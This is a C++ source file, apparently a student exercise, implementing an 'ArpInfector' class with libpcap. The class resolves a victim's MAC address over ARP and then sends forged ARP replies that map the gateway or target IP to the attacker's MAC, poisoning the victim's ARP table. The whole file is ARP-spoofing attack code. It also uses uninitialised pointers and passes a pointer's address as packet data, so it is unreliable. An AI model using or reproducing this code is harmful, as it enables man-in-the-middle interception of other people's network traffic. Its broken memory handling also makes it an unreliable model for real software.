#include "arpInfector.h"

ArpInfector::ArpInfector(char* device, Ip* sender_ip, Ip* target_ip) : device_(device), victim_ip_(sender_ip), target_ip_(target_ip) {
    std::cout << "## ArpInfector::ArpInfector()" << std::endl;
    handle_ = pcap_open_live(device_, BUFSIZ, 1, 1000, errbuf_);
    my_MAC_ = ArpInfector::get_my_MAC();
}

ArpInfector::~ArpInfector(){
    std::cout << "## ArpInfector::~ArpInfector()" << std::endl;
    pcap_close(handle_);
    free(my_MAC_);
    free(victim_MAC_);
}

void ArpInfector::send_arp_request(Ip_Mac_map* ipmac_map, int type) {
    std::cout << "## ArpInfector::send_arp_request(Ip_Mac_map*)" << std::endl;
    EthArpPacket* packet;
    std::cout << "ArpInfector::send_arp_request() EthArpPacket pointer created.." << std::endl;
    
    packet->eth_.dmac_ = ipmac_map->eth_dmac;
	packet->eth_.smac_ = ipmac_map->eth_smac;
	packet->eth_.type_ = htons(EthHdr::Arp);
 
	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;

    if (type == 1) packet->arp_.op_ = htons(ArpHdr::Request);
    else if (type == 2) packet->arp_.op_ = htons(ArpHdr::Reply);

	packet->arp_.smac_ = ipmac_map->arp_smac;
	packet->arp_.sip_ = htonl(ipmac_map->arp_sip);
	packet->arp_.tmac_ = ipmac_map->arp_tmac;
	packet->arp_.tip_ = htonl(ipmac_map->arp_tip);

    std::cout << "ArpInfector::send_arp_request() packet initialized.." << std::endl;

    int res = pcap_sendpacket(handle_, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle_));
    }
    
    std::cout << "ArpInfector::send_arp_request() returned" << std::endl;
}

Mac* ArpInfector::get_my_MAC() {

    std::cout << "## ArpInfector::get_my_MAC()" << std::endl;

    // get MAC addr from /sys/class/net/inteface/address
    std::string device(device_); // std::string constructor
    std::ifstream file("/sys/class/net/" + device + "/address");
    if (file.fail()) {
        fprintf(stderr, "ERROR : error opening file!!\n");
        return 0x00;
    }
    std::string MAC_addr;
    std::getline(file, MAC_addr);
    std::cout << "[+] My MAC address is " << MAC_addr << std::endl;

    // return MAC addr
    Mac* my_MAC = (Mac*)malloc(sizeof(Mac)); // learned from mentor gilgil
    *my_MAC = Mac(MAC_addr);
    return my_MAC; // free in callee needed

}

void ArpInfector::get_victim_MAC() {
    std::cout << "## ArpInfector::get_victim_MAC()" << std::endl;
    
    Mac* result;

    // send arp packet to sender in order to get sender's MAC
    EthArpPacket packet;

    Ip_Mac_map* vIMm; // 'victim IP MAC map'

    vIMm->eth_dmac = Mac("ff:ff:ff:ff:ff:ff");
	vIMm->eth_smac = *my_MAC_; // my MAC
	vIMm->arp_smac = *my_MAC_;
	vIMm->arp_sip = htonl(Ip("8.8.8.159")); // not needed but just set it as gateway ip
	vIMm->arp_tmac = Mac("00:00:00:00:00:00");
	vIMm->arp_tip = htonl(*victim_ip_);

    ArpInfector::send_arp_request(vIMm, 1);
    std::cout << "[+] Sent arp request to victim.." << std::endl;
    

    // capture arp packet
    std::cout << "[+] Capturing arp reply from victim.." << std::endl;
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle_, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle_));
            break;
        }
        
        result = ArpInfector::capture_arp_packet(packet);
        if (result == nullptr) {
            free(result);
            continue;
        }
        else {
            break;
        }
    }
    victim_MAC_ = result;
}

Mac* ArpInfector::capture_arp_packet(const u_char* packet) {
    std::cout << "## ArpInfector::capture_arp_packet(const u_char*)" << std::endl;
    
    EthArpPacket* etharp_packet = (EthArpPacket*)packet;
    if (etharp_packet->eth_.type() != 0x0806) {
        uint16_t type = etharp_packet->eth_.type();
        printf("Not Arp.. %04x\n", type);
        return nullptr;
    }
    if (etharp_packet->arp_.sip_ != htonl(*victim_ip_)) {
        std::cout << "Not " << std::string(etharp_packet->arp_.sip_) << std::endl;
        return nullptr;
    }
    printf("[*] ARP Reply packet captured!!\n");

    Mac* victim_MAC = (Mac*)malloc(sizeof(Mac));
    *victim_MAC = etharp_packet->arp_.smac_;
    std::cout << "[+] Victim\'s MAC address is " << std::string(*victim_MAC) << std::endl;
    return victim_MAC; // free from callee needed
}

void ArpInfector::infect_victim_ARP_table() {
    Ip_Mac_map* vIMm;

    vIMm->eth_dmac = *victim_MAC_;
	vIMm->eth_smac = *my_MAC_; // my MAC
	vIMm->arp_smac = *my_MAC_;
	vIMm->arp_sip = htonl(*target_ip_); // not needed but just set it as gateway ip
	vIMm->arp_tmac = *victim_MAC_;
	vIMm->arp_tip = htonl(*victim_ip_);

    ArpInfector::send_arp_request(vIMm, 2);
    std::cout << "[+] Infected victim.." << std::endl;

}

// reference : https://stackoverflow.com/questions/65675190/implementing-cat-in-linux-system